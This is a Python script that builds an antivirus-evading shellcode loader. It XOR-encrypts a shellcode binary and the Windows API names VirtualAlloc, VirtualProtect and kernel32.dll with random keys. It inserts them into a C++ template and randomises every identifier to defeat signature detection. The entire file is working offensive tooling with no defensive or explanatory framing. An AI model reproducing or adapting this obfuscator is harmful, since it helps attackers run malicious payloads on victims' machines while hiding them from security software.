import sys
import random
import string
import os
import time
import argparse


def get_random_string():
    # With combination of lower and upper case
    length = random.randint(8, 15)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    # print random string
    return result_str

def xor(data):
    
    key = get_random_string()
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x) # handle data being bytes not string
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext, key

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("path_to_bin", type=str, default="shellcode.bin", help="path to shellcode bin file")
    args = parser.parse_args()

    try:
        shellcode = open(args.path_to_bin, "rb").read()
    except Exception as e:
        print("Something went wrong with trying to read your bin file.")
        print(e)
        sys.exit(1)

    # Encrypt strings
    buf, pl_key = xor(shellcode)
    virtual_alloc, va_key = xor("VirtualAlloc")
    virtual_protect, vp_key = xor("VirtualProtect")
    kernel32, k_key = xor("kernel32.dll")

    # Obfuscate variable names
    execute_name = get_random_string()
    payloadAddress_name = get_random_string()
    buf_name = get_random_string()
    virtual_alloc_name = get_random_string()
    virtual_protect_name = get_random_string()
    kernel32_name = get_random_string()
    pl_key_name = get_random_string()
    va_key_name = get_random_string()
    vp_key_name = get_random_string()
    k_key_name = get_random_string()
    pVirtualAlloc_name = get_random_string()
    pVirtualProtect_name = get_random_string()
    oldProt_name = get_random_string()
    success_name = get_random_string()
    sCF_name = get_random_string()
    XOR_name = get_random_string()
    ConvertUnsignedCharArrayToLPCSTR_name = get_random_string()
    bstr_name = get_random_string()
    k32_wide_name = get_random_string()
    va_wide_name = get_random_string()
    vp_wide_name = get_random_string()

    # Replace names and stuff
    template = open("template.cpp", "rt")
    data = template.read()
    time.sleep(1)

    # Replace char arrays with obfucated versions
    data = data.replace('unsigned char buf[] = { };', 'unsigned char buf[] = ' + buf)
    data = data.replace('unsigned char virtual_alloc[] = { };', 'unsigned char virtual_alloc[] = ' + virtual_alloc)
    data = data.replace('unsigned char virtual_protect[] = { };', 'unsigned char virtual_protect[] = ' + virtual_protect)
    data = data.replace('unsigned char kernel32[] = { };', 'unsigned char kernel32[] = ' + kernel32)
    
    # Add decryption keys
    data = data.replace('char pl_key[] = ""', 'char pl_key[] = "' + pl_key + '";')
    data = data.replace('char va_key[] = ""', 'char va_key[] = "' + va_key + '";')
    data = data.replace('char vp_key[] = ""', 'char vp_key[] = "' + vp_key + '";')
    data = data.replace('char k_key[] = ""', 'char k_key[] = "' + k_key + '";')
   
    # Replace variable names
    data = data.replace('execute', execute_name)
    data = data.replace('payloadAddress', payloadAddress_name)
    data = data.replace('buf', buf_name)
    data = data.replace('virtual_alloc', virtual_alloc_name)
    data = data.replace('virtual_protect', virtual_protect_name)
    data = data.replace('kernel32', kernel32_name)
    data = data.replace('pl_key', pl_key_name)
    data = data.replace('va_key', va_key_name)
    data = data.replace('vp_key', vp_key_name)
    data = data.replace('k_key', k_key_name)
    data = data.replace('pVirtualAlloc', pVirtualAlloc_name)
    data = data.replace('pVirtualProtect', pVirtualProtect_name)
    data = data.replace('oldProt', oldProt_name)
    data = data.replace('success', success_name)
    data = data.replace('sCF', sCF_name)
    data = data.replace('XOR', XOR_name)
    data = data.replace('ConvertUnsignedCharArrayToLPCSTR', ConvertUnsignedCharArrayToLPCSTR_name)
    data = data.replace('bstr', bstr_name)
    data = data.replace('k32_wide', k32_wide_name)
    data = data.replace('va_wide', va_wide_name)
    data = data.replace('vp_wide', vp_wide_name)

    template.close()
    template = open("temp.cpp", "w+")
    template.write(data)
    time.sleep(1)
    template.close


if __name__ == "__main__":
    main()

